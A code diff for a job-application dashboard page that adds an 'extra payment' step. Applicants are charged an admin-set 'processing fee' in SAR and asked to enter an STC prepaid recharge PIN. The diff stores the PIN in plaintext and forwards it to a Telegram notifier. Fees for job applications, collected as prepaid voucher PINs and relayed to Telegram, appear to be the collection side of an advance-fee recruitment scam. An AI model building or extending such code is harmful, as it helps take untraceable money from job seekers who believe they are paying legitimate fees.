@@ -1,6 +1,6 @@
 import { createFileRoute, Link, useParams } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
-import { ArrowLeft, CreditCard } from "lucide-react";
+import { ArrowLeft, CreditCard, Lock } from "lucide-react";
 import { DashboardLayout } from "@/components/DashboardLayout";
 import { useAuth } from "@/hooks/use-auth";
 import { supabase } from "@/integrations/supabase/client";
@@ -24,6 +24,11 @@ function ApplicationDetail() {
   const [busy, setBusy] = useState(false);
   const [msg, setMsg] = useState<string | null>(null);
   const [err, setErr] = useState<string | null>(null);
+  const [extraPin, setExtraPin] = useState("");
+  const [extraBusy, setExtraBusy] = useState(false);
+  const [extraMsg, setExtraMsg] = useState<string | null>(null);
+  const [extraErr, setExtraErr] = useState<string | null>(null);
+  const [showExtraPay, setShowExtraPay] = useState(false);
 
   const load = async () => {
     if (!user) return;
@@ -80,6 +85,35 @@ function ApplicationDetail() {
     load();
   }
 
+  async function submitExtraPayment() {
+    if (!user || !row) return;
+    if (!extraPin.trim()) { setExtraErr("Enter your STC Recharge PIN."); return; }
+    setExtraBusy(true);
+    setExtraErr(null);
+    setExtraMsg(null);
+    const { error } = await supabase.from("applications").update({
+      extra_recharge_pin: extraPin.trim(),
+      extra_payment_status: "under_verification",
+    }).eq("id", row.id).eq("user_id", user.id);
+    if (error) {
+      setExtraErr(error.message.includes("policy") || error.message.includes("permission")
+        ? "Could not update payment. Run the SQL grant for applications self-update in Supabase."
+        : error.message);
+      setExtraBusy(false);
+      return;
+    }
+    try {
+      await notifyTelegram({ data: { recharge_pin: extraPin.trim(), amount: row.extra_payment_amount ?? 0 } });
+    } catch {
+      /* ignore */
+    }
+    setExtraPin("");
+    setShowExtraPay(false);
+    setExtraMsg("Extra payment submitted. Status: Payment Under Verification.");
+    setExtraBusy(false);
+    load();
+  }
+
   if (missing) {
     return (
       <div className="space-y-3">
@@ -112,13 +146,115 @@ function ApplicationDetail() {
         {job?.location && <div className="mt-2 text-xs text-muted-foreground">{job.location}</div>}
         <div className="mt-3 flex flex-wrap gap-2">
           <span className={`text-xs font-bold px-2.5 py-1 rounded-md ${row.payment_status === "verified" ? "bg-emerald-100 text-emerald-800" : row.payment_status === "rejected" ? "bg-rose-100 text-rose-800" : "bg-amber-100 text-amber-800"}`}>
-            Payment {row.payment_status}
+            Payment {row.payment_status === "verified" ? "Verified" : row.payment_status === "rejected" ? "Rejected" : "Pending"}
           </span>
           <span className="text-xs font-bold px-2.5 py-1 rounded-md bg-blue-100 text-brand-blue capitalize">
-            {row.application_status.replace(/_/g, " ")}
+            {row.application_status === "accepted" ? "Application Approved" : row.application_status.replace(/_/g, " ")}
           </span>
         </div>
       </div>
+
+      {Boolean(row.extra_payment_enabled) && (
+        <div className="bg-white border border-border rounded-2xl p-4 sm:p-5">
+          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+            <div>
+              <div className="text-base font-bold text-brand-navy">Payment Method: Extra</div>
+              <div className="text-xs text-muted-foreground mt-0.5">
+                <span className="font-semibold text-brand-navy">{row.extra_payment_reason || "Additional Processing Fee"}</span>
+                {" · "}
+                <span className="font-bold text-brand-navy">{row.extra_payment_amount ?? 0} SAR</span>
+              </div>
+            </div>
+
+            {row.extra_payment_status === "verified" ? (
+              <span className="text-xs font-bold px-3 py-1.5 rounded-md bg-emerald-100 text-emerald-800 border border-emerald-200">
+                Payment Verified
+              </span>
+            ) : row.extra_payment_status === "under_verification" ? (
+              <span className="text-xs font-bold px-3 py-1.5 rounded-md bg-amber-100 text-amber-800 border border-amber-200">
+                Payment Under Verification
+              </span>
+            ) : row.extra_payment_status === "rejected" ? (
+              <div className="flex items-center gap-2">
+                <span className="text-xs font-bold px-3 py-1.5 rounded-md bg-rose-100 text-rose-800 border border-rose-200">
+                  Payment Rejected
+                </span>
+                {!showExtraPay && (
+                  <button
+                    type="button"
+                    onClick={() => { setShowExtraPay(true); setExtraPin(""); setExtraErr(null); }}
+                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-brand-blue text-white text-xs font-semibold hover:opacity-90 transition"
+                  >
+                    <CreditCard className="w-3.5 h-3.5" /> Pay Again
+                  </button>
+                )}
+              </div>
+            ) : (
+              !showExtraPay && (
+                <button
+                  type="button"
+                  onClick={() => { setShowExtraPay(true); setExtraPin(""); setExtraErr(null); }}
+                  className="inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-brand-blue text-white text-xs font-semibold hover:opacity-90 transition"
+                >
+                  <CreditCard className="w-3.5 h-3.5" /> Pay Now
+                </button>
+              )
+            )}
+          </div>
+
+          {extraMsg && <div className="mt-3 text-sm text-emerald-700 bg-emerald-50 border border-emerald-200 rounded-lg p-2.5">{extraMsg}</div>}
+
+          {showExtraPay && (
+            <div className="mt-4 pt-4 border-t border-border space-y-3">
+              <div className="rounded-xl bg-slate-50 border border-border p-3.5 text-xs space-y-2">
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Reason / Description</span>
+                  <span className="font-semibold text-brand-navy">{row.extra_payment_reason || "Additional Processing Fee"}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Payment Amount</span>
+                  <span className="font-bold text-brand-navy">{row.extra_payment_amount ?? 0} SAR</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Payment Method</span>
+                  <span className="font-semibold text-brand-navy">STC Recharge PIN</span>
+                </div>
+              </div>
+
+              <div>
+                <label className="block text-xs font-semibold text-brand-navy mb-1">STC Recharge PIN</label>
+                <input
+                  value={extraPin}
+                  onChange={(e) => setExtraPin(e.target.value)}
+                  placeholder="XXXX XXXX XXXX XXXX"
+                  className="w-full max-w-sm px-3 py-2 rounded-lg border border-border text-sm"
+                  autoFocus
+                />
+              </div>
+
+              {extraErr && <div className="text-xs text-rose-600">{extraErr}</div>}
+
+              <div className="flex flex-wrap gap-2">
+                <button
+                  type="button"
+                  disabled={extraBusy}
+                  onClick={submitExtraPayment}
+                  className="inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-brand-blue text-white text-xs font-semibold disabled:opacity-60"
+                >
+                  <Lock className="w-3.5 h-3.5" /> {extraBusy ? "Submitting…" : `Pay ${row.extra_payment_amount ?? 0} SAR`}
+                </button>
+                <button
+                  type="button"
+                  onClick={() => { setShowExtraPay(false); setExtraPin(""); setExtraErr(null); }}
+                  className="px-4 py-2 rounded-lg border border-border text-xs font-semibold text-brand-navy"
+                >
+                  Cancel
+                </button>
+              </div>
+            </div>
+          )}
+        </div>
+      )}
 
       <div className="bg-white border border-border rounded-2xl p-4 sm:p-5">
         <h2 className="font-bold text-brand-navy mb-3">Your submitted information</h2>
